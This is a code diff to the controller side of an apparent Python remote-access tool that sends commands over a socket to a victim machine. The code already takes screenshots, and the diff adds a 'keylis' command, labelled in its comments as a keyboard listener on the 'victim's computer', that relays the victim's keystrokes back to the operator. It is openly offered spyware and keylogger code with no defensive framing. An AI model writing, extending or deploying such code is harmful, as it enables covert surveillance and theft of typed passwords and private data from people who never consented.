@@ -1,6 +1,7 @@
 import socket
 import shutil
 import os
+import keyboard
 
 #consts
 HOST = '127.0.0.1'
@@ -53,6 +54,14 @@ def main():
                     print("command sent!")#log
                     get_screenshot(connection)
                     print("screeshot was taken...")#log
+                #active a keyboard listener on victim's computer
+                elif command == "keylis":
+                    connection.send(command.encode(HASH))
+                    print("command sent!")
+                    def listen_for_keys(event):
+                        print(connection.recv(BUFFER_SIZE).decode(HASH))
+                    keyboard.hook(listen_for_keys)
+                    keyboard.wait('esc')
                 #stop the server after a non-command input
                 else:
                     break
